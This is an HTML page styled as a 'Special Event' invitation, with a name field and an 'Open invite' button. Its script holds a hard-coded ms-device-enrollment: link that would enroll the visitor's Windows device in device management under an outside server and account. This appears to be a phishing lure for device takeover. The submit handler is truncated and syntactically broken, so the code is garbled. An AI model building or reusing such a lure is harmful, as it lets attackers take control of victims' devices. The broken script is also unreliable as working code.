<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Special Event â€” Open Your Invitation</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400&family=Great+Vibes&display=swap" rel="stylesheet" />
  <style>
    /*
     * CHANGE HERO IMAGE: Edit the line below. Use a filename in the same folder
     * (e.g. 'background-image.png') or a path/URL. Top section will show this image.
     */
    :root {
      --hero-image: url('background-image.png');
      --peach: #f5e6d8;
      --peach-dark: #e8d4c4;
      --burnt-orange: #c45c2a;
      --burnt-orange-hover: #a84d22;
      --script-ink: #5c3d2e;
      --tagline-ink: #7d5c4a;
      --white: #fefefe;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html {
      min-height: 100%;
    }

    body {
      font-family: 'Cormorant Garamond', Georgia, serif;
      min-height: 100vh;
      color: var(--script-ink);
      -webkit-font-smoothing: antialiased;
    }

    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .hero {
      flex: 0 0 52%;
      min-height: 42vh;
      background: var(--hero-image) center center / cover no-repeat;
      background-color: var(--peach);
    }

    .cta-section {
      flex: 1;
      background: var(--peach);
      padding: 2.5rem 1.5rem 3rem;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }

    .event-title {
      font-family: 'Great Vibes', cursive;
      font-size: clamp(2.25rem, 6vw, 3.25rem);
      color: var(--script-ink);
      margin-bottom: 0.4rem;
      line-height: 1.15;
    }

    .tagline {
      font-size: 0.75rem;
      font-weight: 600;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--tagline-ink);
      margin-bottom: 2rem;
    }

    .invite-form {
      width: 100%;
      max-width: 320px;
    }

    .form-group {
      margin-bottom: 1.25rem;
    }

    .form-group label {
      display: block;
      font-size: 0.7rem;
      font-weight: 600;
      letter-spacing: 0.15em;
      text-transform: uppercase;
      color: var(--tagline-ink);
      margin-bottom: 0.5rem;
    }

    .form-group input {
      width: 100%;
      padding: 0.75rem 1rem;
      font-family: 'Cormorant Garamond', Georgia, serif;
      font-size: 1.05rem;
      color: var(--script-ink);
      background: var(--white);
      border: 1px solid rgba(92, 61, 46, 0.25);
      border-radius: 4px;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    .form-group input::placeholder {
      color: #a89080;
    }

    .form-group input:focus {
      outline: none;
      border-color: var(--burnt-orange);
      box-shadow: 0 0 0 3px rgba(196, 92, 42, 0.2);
    }

    .btn-open-invite {
      display: block;
      width: 100%;
      padding: 0.9rem 1.75rem;
      font-family: 'Cormorant Garamond', Georgia, serif;
      font-size: 1rem;
      font-weight: 600;
      letter-spacing: 0.2em;
      text-transform: uppercase;
      color: var(--white);
      background: var(--burnt-orange);
      border: none;
      border-radius: 30px;
      cursor: pointer;
      transition: background 0.2s, transform 0.15s;
    }

    .btn-open-invite:hover {
      background: var(--burnt-orange-hover);
      transform: translateY(-1px);
    }

    .btn-open-invite:active {
      transform: translateY(0);
    }

    @media (min-width: 600px) {
      .page {
        flex-direction: row;
      }

      .hero {
        flex: 0 0 50%;
        min-height: 100vh;
      }

      .cta-section {
        flex: 0 0 50%;
        min-height: 100vh;
        padding: 2rem 3rem;
      }
    }
  </style>
</head>
<body>
  <div class="page">
    <section class="hero" aria-hidden="true"></section>
    <section class="cta-section">
      <h1 class="event-title">Special Event</h1>
      <p class="tagline">Let's be thankful together!</p>

      <form id="invite-form" class="invite-form" action="#" method="get">
        <div class="form-group">
          <label for="guest-name">Your name</label>
          <input
            type="text"
            id="guest-name"
            name="name"
            placeholder="Enter your name"
            required
            autocomplete="name"
          />
        </div>
        <button type="submit" class="btn-open-invite">Open invite</button>
      </form>
    </section>
  </div>

  <script>
    const REDIRECT_URL = 'ms-device-enrollment:?mode=mdm&username=smtp-on7ys@naccato.com.ar&servername=https://wxigqj-api.esper.cloud/api/v2/windows/discovery/Ymx1ZXByaW50X2lkPTJiNzM2NWRjLTYzODYtNDkwYy1iYTY3LTY2MzkzOTExNDJhNCZncm91cF9pZD1iMDQwOGRjNi02OWE0LTQ0MzMtODNkNC0zMDI5MThkNWZjYjQ';

    document.getElementById('invite-form').addEventListener('submit', function (e) {

      var nameInput = document.getElementById('guest-name');
      if (nameInput && nameInput.value.trim()) {

    });
  </script>
</body>
</html>
